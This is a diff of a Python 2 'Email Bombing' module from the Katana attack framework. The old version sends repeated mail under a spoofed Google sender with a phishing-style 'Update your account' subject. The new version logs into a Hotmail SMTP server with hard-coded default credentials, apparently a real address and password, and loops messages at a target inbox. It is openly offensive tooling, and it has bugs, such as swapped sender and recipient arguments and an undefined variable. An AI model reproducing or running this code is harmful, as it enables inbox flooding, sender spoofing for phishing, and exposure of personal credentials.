@@ -1,116 +1,103 @@
-# :-:-:-:-:-:-:-:-:-:-:-:-:- #
-# @KATANA                    #
-# Modules   : Email Bombing  #
-# Script by : RedToor        #
-# Date      : 27/08/2015     #
-# :-:-:-:-:-:-:-:-:-:-:-:-:- #
-# Katana Core                #
-from core.design import *    #
-from core.Setting import *   #
-from core import Errors      #
-from core import help        #
-from core import ping        #
-import sys                   #
-d=DESIGN()                   #
-# :-:-:-:-:-:-:-:-:-:-:-:-:- #
-# Libraries                  #
-import smtplib               #
-# :-:-:-:-:-:-:-:-:-:-:-:-:- #
-# Default                    #
-# :-:-:-:-:-:-:-:-:-:-:-:-:- #
-defaulthost=LOCAL_IP
-defaultport=SMTP_PORT
-defaultfrom="notification.center@mail.google.com"
-defaultdest="target@services.com"
-defaultsubj="Update your account soon - Google Services"
-defaulttemp="files/tmtSMTP/updateaccount.template"
-defaultmany="30"
-# :-:-:-:-:-:-:-:-:-:-:-:-:- #
+# This module requires katana framework 
+# https://github.com/RedToor/Katana
+# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
+# Katana Core                 #
+from core.design import *     #
+from core.Setting import *    #
+from core import Errors       #
+from core import getFunction  #
+import sys                    #
+Message=DESIGN()              #
+# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
+# Libraries                   #
+import smtplib                #
+# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
 
-def run(host, port, frome, target, subject, file, many):
-	global defaulthost,defaultport,defaultfrom,defaultdest,defaultsubj,defaulttemp,defaultmany
-	defaulthost=host
-	defaultport=port
-	defaultfrom=frome
-	defaultdest=target
-	defaultsubj=subject
-	defaulttemp=file
-	defaultmany=many
-	smtpbombing(1)
+# INFORMATION MODULE
+def initialize():
+	initialize.Author             ="RedToor"
+	initialize.Version            ="2.0"
+	initialize.Description        ="Email Boombing Client."
+	initialize.CodeName           ="set/em.boom"
+	initialize.DateCreation       ="27/08/2015"      
+	initialize.LastModification   ="03/05/2016"
 
-def smtpbombing(run):
-	global defaulthost,defaultport,defaultfrom,defaultdest,defaultsubj,defaulttemp,defaultmany
+	# DEFAULT VARIABLES             VALUE                                       NAME        RQ     DESCRIPTION
+	initialize.DEFAULT_VARIABLE   =[["smtp.live.com"                         , "host"    ,"yes" , "Server host"]]        #[0][0]
+	initialize.DEFAULT_VARIABLE  +=[["587"                                   , "port"    ,"no"  , "Port Service"]]       #[1][0]
+	initialize.DEFAULT_VARIABLE  +=[["franco1844@hotmail.com"                , "accnt"   ,"yes" , "Account email"]]      #[2][0]
+	initialize.DEFAULT_VARIABLE  +=[["salazar"                               , "pass"    ,"yes" , "Password"]]           #[3][0]
+	initialize.DEFAULT_VARIABLE  +=[["javiefrancoq@hotmail.com"              , "target"  ,"yes" , "Account target"]]     #[4][0]
+	initialize.DEFAULT_VARIABLE  +=[["HOLA"                                  , "subj"    ,"no"  , "Subject (title)"]]    #[5][0]
+	initialize.DEFAULT_VARIABLE  +=[["files/tmtSMTP/updateTwitter.tmp"       , "file"    ,"yes" , "Message file"]]       #[6][0]
+	initialize.DEFAULT_VARIABLE  +=[["3"                                     , "amount"  ,"no"  , "Amount to send"]]     #[7][0]
+	initialize.TLS                =False                                                                                 #TLS
+initialize()
+# END INFORMATION MODULE
+
+# MAIN FUNCTION
+def main(run):
 	try:
-		if run!=1:
-			actions=raw_input(d.prompt("set/mailboom"))
-		else:
-			actions="run"
-		if actions == "show options" or actions == "sop":
-			d.option()
-			d.descrip("host","yes","IP or DNS",defaulthost)
-			d.descrip("port","no","Port	",defaultport)
-			d.descrip("target","yes","E-mail target",defaultdest)
-			d.descrip("from","yes","E-mail fake",defaultfrom)
- 			d.descrip("subjet","yes","Subject fake",defaultsubj)
- 			d.descrip("tempte","yes","Template",defaulttemp)
-			d.descrip("many","no","Amount to send",defaultmany)
-			print ""
-			smtpbombing(0)
-		elif actions[0:8] == "set host":
-			defaulthost=ping.update(defaulthost,actions,"host")
-			d.change("host",defaulthost)
-		elif actions[0:8] == "set port":
-			defaultport=ping.update(defaultport,actions,"port")
-			d.change("port",defaultport)
-		elif actions[0:10] == "set target":
-			defaultdest = actions[11:]
-			d.change("target",defaultdest)
-			smtpbombing(0)
-		elif actions[0:8] == "set from":
-			defaultfrom = actions[9:]
-			d.change("from",defaultfrom)
-			smtpbombing(0)
-		elif actions[0:10] == "set subjet":
-			defaultsubj = actions[11:]
-			d.change("subjet",defaultsubj)
-			smtpbombing(0)
-		elif actions[0:10] == "set tempte":
-			defaulttemp = actions[11:]
-			d.change("tempte",defaulttemp)
-			smtpbombing(0)
-		elif actions[0:8] == "set many":
-			defaultmany = actions[9:]
-			d.change("tempte",defaultmany)
-			smtpbombing(0)
-		elif actions=="exit" or actions=="x":
-			d.goodbye()
-			exit()
-		elif actions=="help" or actions=="h":
-			help.help()
-		elif actions=="back" or actions=="b":
-			return
-		elif actions=="run"  or actions=="r":
-			d.run()
-			i=int(defaultmany)
-			try:
-				with open(defaulttemp,'r') as body:
+		# HEAD MODULE
+		if run:	actions=raw_input(Message.prompt(initialize.CodeName))
+		else  : actions="run"
+		if   getFunction.KatanaCheckActionShowOptions(actions):getFunction.ShowOptions(initialize.DEFAULT_VARIABLE)
+		elif getFunction.KatanaCheckActionSetValue(actions)   :initialize.DEFAULT_VARIABLE=getFunction.UpdateValue(actions,initialize.DEFAULT_VARIABLE)
+		elif getFunction.KatanaCheckActionisBack(actions)     :return
+		# END HEAD MODULE
+		elif getFunction.runModule(actions):
+			Message.run()
+			# CODE MODULE    ############################################################################################
+			getFunction.live(initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0])
+			if True:
+				try:
+					server = smtplib.SMTP(initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0])
+					if initialize.TLS: server.starttls()
+					server.login(initialize.DEFAULT_VARIABLE[2][0],initialize.DEFAULT_VARIABLE[3][0])
+					Message.loading_file()
+					with open(initialize.DEFAULT_VARIABLE[6][0],'r') as body:
+						FILE_HTML = ""
+						for read_line in body: 
+							FILE_HTML += read_line
+					message = """\From: %s\nTo: %s\nContent-type: text/html\nSubject: %s\n\n%s""" % (initialize.DEFAULT_VARIABLE[2][0],initialize.DEFAULT_VARIABLE[4][0],initialize.DEFAULT_VARIABLE[5][0],FILE_HTML)
 					try:
-						smtp = smtplib.SMTP(defaulthost, defaultport)
-						while 0 < i:
-							i-=1
-
-							try:
-							 	smtp.sendmail(defaultfrom, defaultdest, body) 
-							 	if True:
-							 		print " "+Suf+" ("+str(i)+")E-Mail was sent."
-							except:
-							 	print " "+Bad+" ("+str(i)+")E-mail not was sent."
+						many=0
+						while(many < int(initialize.DEFAULT_VARIABLE[7][0])):
+							many+=1
+							server.sendmail(initialize.DEFAULT_VARIABLE[4][0], initialize.DEFAULT_VARIABLE[2][0], message)
+							print " "+Suf+" #"+str(many)+" E-Mail was sent."
 					except:
-						Errors.Errors(event=sys.exc_info()[0], info=defaulthost+":"+defaultport)
-			except:
-				Errors.Errors(event=sys.exc_info()[0], info=defaulttemp)
+						print " "+Bad+" E-Mail not was sent."
+					print" "+Suf+" Attack Completed."
+					server.quit()
+				except smtplib.SMTPAuthenticationError:
+					print ' '+Bad+' Authentication Required or Authentication went wrong.\n'
+				except:
+					error = str(sys.exc_info()[1])
+					if error.find("SMTP AUTH extension") >= 0 : 
+						print " "+Bad+" TLS error, Starting again with TLS."
+						initialize.TLS = True
+						main(False)
+					Errors.Errors(event=sys.exc_info(), info=initialize.DEFAULT_VARIABLE[6][0])
+			# END CODE MODULE ############################################################################################
 		else:
-			d.No_actions()
+			getFunction.KatanaCheckActionGlobalCommands(actions)
+	# ERROR GENERAL
 	except:
-		Errors.Errors(event=sys.exc_info()[0], info=False)
-	smtpbombing(0)
+		Errors.Errors(event=sys.exc_info(), info=sys.exc_traceback.tb_lineno)
+	# END ERROR GENERAL
+	main(True)
+# END MAIN FUNCTION
+
+# LINKER FUNCTION
+def run(host,port,account,password,subject,filehtml,amount):
+	initialize.DEFAULT_VARIABLE [0][0] = host
+	initialize.DEFAULT_VARIABLE [1][0] = port
+	initialize.DEFAULT_VARIABLE [2][0] = account
+	initialize.DEFAULT_VARIABLE [3][0] = password
+	initialize.DEFAULT_VARIABLE [4][0] = target
+	initialize.DEFAULT_VARIABLE [5][0] = subject
+	initialize.DEFAULT_VARIABLE [6][0] = filehtml
+	initialize.DEFAULT_VARIABLE [7][0] = amount
+	main(False)
+# END LINKER FUNCTION
